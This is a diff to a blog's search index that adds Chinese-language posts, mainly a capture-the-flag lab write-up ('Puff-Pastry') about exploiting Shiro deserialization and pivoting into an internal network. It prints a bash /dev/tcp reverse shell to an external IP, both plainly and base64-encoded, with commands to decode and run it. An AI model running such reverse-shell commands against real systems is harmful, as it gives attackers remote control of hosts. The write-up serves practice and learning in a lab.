@@ -4,6 +4,46 @@
   
     
     <entry>
+      <title>chisel的使用</title>
+      <link href="/2025/06/08/chisel%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+      <url>/2025/06/08/chisel%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 内网 </tag>
+            
+            <tag> 代理工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Puff-Pastry</title>
+      <link href="/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/"/>
+      <url>/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://github.com/CTF-Archives/Puff-Pastry">https://github.com/CTF-Archives/Puff-Pastry</a></p><p>网络拓扑图：</p><img src="../images/image-20250606175402519.png" alt="image-20250606175402519" style="zoom:80%;" /><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/../images/image-20250606175422906.png" alt="image-20250606175422906"></p><p>一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用<code>Shiro反序列化利用工具</code>直接打</p><p><img src="/../images/image-20250606175538502.png" alt="image-20250606175538502"></p><p>可以执行命令了<code>cat /flag.txt</code></p><p><code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>先反弹shell吧</p><p>反弹shell命令base64编码一下</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.133.198.27&#x2F;1122 0&gt;&amp;1*</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMy4xOTguMjcvMTEyMiAwPiYx | base64 -d &gt; /tmp/shell.sh</span><br><span class="line"> chmod +x /tmp/shell.sh</span><br><span class="line"> ls -lh /tmp/shell.sh</span><br><span class="line"> /bin/bash /tmp/shell.sh</span><br></pre></td></tr></table></figure><p>然后下载一下fscan扫描内网</p><p>扫描之后发现<code>192.168.100.2/24</code>这个网段有两台机器有问题：</p><p><del>192.168.100.2 shiro反序列化 已经拿下</del></p><p><em>192.168.100.3 thinkphp  未拿下</em></p><p>这个机器是在内网，所以我们需要搭建代理隧道</p><p>a</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 内网靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PT-1</title>
       <link href="/2025/06/04/PT-1/"/>
       <url>/2025/06/04/PT-1/</url>
